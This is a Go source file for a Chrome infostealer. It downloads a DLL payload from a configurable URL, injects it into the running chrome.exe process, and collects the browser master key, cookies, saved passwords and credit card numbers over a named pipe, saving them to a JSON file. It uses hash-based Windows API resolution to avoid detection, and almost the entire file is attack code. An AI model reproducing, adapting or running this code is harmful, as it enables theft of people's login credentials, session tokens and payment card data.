package main

import (
	"encoding/json"
	"os"
	"strings"
	"time"
	"unsafe"

	"github.com/carved4/gobound/pkg/loader"
	"github.com/carved4/gobound/pkg/net"
	"github.com/carved4/gobound/pkg/process"

	wc "github.com/carved4/go-wincall"
)

// change this prior to run, host somewhere like https://www.station307.com/
const (
	downloadURL = ""
)

type Cookie struct {
	Profile string `json:"profile"`
	Host    string `json:"host"`
	Name    string `json:"name"`
	Value   string `json:"value"`
}

type Password struct {
	Profile  string `json:"profile"`
	URL      string `json:"url"`
	Username string `json:"username"`
	Password string `json:"password"`
}

type Card struct {
	Profile    string `json:"profile"`
	NameOnCard string `json:"name_on_card"`
	Expiration string `json:"expiration"`
	Number     string `json:"number"`
}

type Output struct {
	Timestamp string     `json:"timestamp"`
	MasterKey string     `json:"master_key"`
	Cookies   []Cookie   `json:"cookies"`
	Passwords []Password `json:"passwords"`
	Cards     []Card     `json:"cards"`
}

var (
	k32base          = wc.GetModuleBase(wc.GetHash("kernel32.dll"))
	closeHandle      = wc.GetFunctionAddress(k32base, wc.GetHash("CloseHandle"))
	createNamedPipeW = wc.GetFunctionAddress(k32base, wc.GetHash("CreateNamedPipeW"))
	connectNamedPipe = wc.GetFunctionAddress(k32base, wc.GetHash("ConnectNamedPipe"))
	readFile         = wc.GetFunctionAddress(k32base, wc.GetHash("ReadFile"))
)

const (
	pipeAccessDuplex    = 0x3
	pipeTypeMessage     = 0x4
	pipeReadmodeMessage = 0x2
	pipeWait            = 0x0
	invalidHandleValue  = ^uintptr(0)
	pipeName            = `\\.\pipe\chromepipe`
)

func createPipeServer() uintptr {
	pipeNamePtr, _ := wc.UTF16ptr(pipeName)

	hPipe, _, _ := wc.CallG0(createNamedPipeW,
		uintptr(unsafe.Pointer(pipeNamePtr)),
		uintptr(pipeAccessDuplex),
		uintptr(pipeTypeMessage|pipeReadmodeMessage|pipeWait),
		uintptr(1),
		uintptr(4096),
		uintptr(4096),
		uintptr(0),
		uintptr(0),
	)
	return hPipe
}

func injectDLL() {
	hPipe := createPipeServer()
	if hPipe == invalidHandleValue || hPipe == 0 {
		panic("CreateNamedPipeW failed")
	}
	println("[+] pipe created and listening:", pipeName)

	_, hProcess, err := process.FindTargetProcess("chrome.exe")
	if err != nil {
		panic(err)
	}
	println("[+] downloading payload...")
	dllBytes, err := net.Download(downloadURL)
	if err != nil {
		panic(err)
	}
	println("[+] received", len(dllBytes), "bytes")
	err = loader.LoadDLLRemote(hProcess, dllBytes)
	if err != nil {
		println("[-] loaddllremote error:", err.Error())
	}
	wc.CallG0(connectNamedPipe, hPipe, uintptr(0))
	println("[+] dll connected to our pipe :3")

	output := Output{
		Timestamp: time.Now().Format(time.RFC3339),
		Cookies:   []Cookie{},
		Passwords: []Password{},
		Cards:     []Card{},
	}

	buf := make([]byte, 4096)
	for {
		var bytesRead uint32
		ret, _, _ := wc.CallG0(readFile,
			hPipe,
			uintptr(unsafe.Pointer(&buf[0])),
			uintptr(len(buf)),
			uintptr(unsafe.Pointer(&bytesRead)),
			uintptr(0),
		)

		if ret == 0 {
			break
		}
		if bytesRead == 0 {
			continue
		}
		msgLen := bytesRead
		if msgLen > 0 && buf[msgLen-1] == 0 {
			msgLen--
		}
		msg := string(buf[:msgLen])
		if strings.HasPrefix(msg, "KEY:") {
			output.MasterKey = strings.TrimPrefix(msg, "KEY:")
			println("[+] got master key")
		} else if strings.HasPrefix(msg, "COOKIE:") {
			data := strings.TrimPrefix(msg, "COOKIE:")
			if profile, rest, ok := parseProfile(data); ok {
				parts := strings.SplitN(rest, "|", 3)
				if len(parts) == 3 {
					output.Cookies = append(output.Cookies, Cookie{
						Profile: profile,
						Host:    parts[0],
						Name:    parts[1],
						Value:   parts[2],
					})
				}
			}
		} else if strings.HasPrefix(msg, "PASSWORD:") {
			data := strings.TrimPrefix(msg, "PASSWORD:")
			if profile, rest, ok := parseProfile(data); ok {
				parts := strings.SplitN(rest, "|", 3)
				if len(parts) == 3 {
					output.Passwords = append(output.Passwords, Password{
						Profile:  profile,
						URL:      parts[0],
						Username: parts[1],
						Password: parts[2],
					})
				}
			}
		} else if strings.HasPrefix(msg, "DEBUG:") {
			println("[DEBUG]", strings.TrimPrefix(msg, "DEBUG:"))
		} else if strings.HasPrefix(msg, "CARD:") {
			data := strings.TrimPrefix(msg, "CARD:")
			if profile, rest, ok := parseProfile(data); ok {
				parts := strings.SplitN(rest, "|", 3)
				if len(parts) == 3 {
					output.Cards = append(output.Cards, Card{
						Profile:    profile,
						NameOnCard: parts[0],
						Expiration: parts[1],
						Number:     parts[2],
					})
				}
			}
		} else if msg == "DONE" {
			break
		}
	}

	wc.CallG0(closeHandle, hPipe)
	wc.CallG0(closeHandle, hProcess)
	jsonData, _ := json.MarshalIndent(output, "", "  ")
	os.WriteFile("chrome_data.json", jsonData, 0644)

	println("[+] saved", len(output.Cookies), "cookies,", len(output.Passwords), "passwords,", len(output.Cards), "cards to chrome_data.json")
}

func main() {
	injectDLL()
}

func parseProfile(data string) (profile, rest string, ok bool) {
	if !strings.HasPrefix(data, "[") {
		return "", data, false
	}
	end := strings.Index(data, "]")
	if end == -1 {
		return "", data, false
	}
	return data[1:end], data[end+1:], true
}
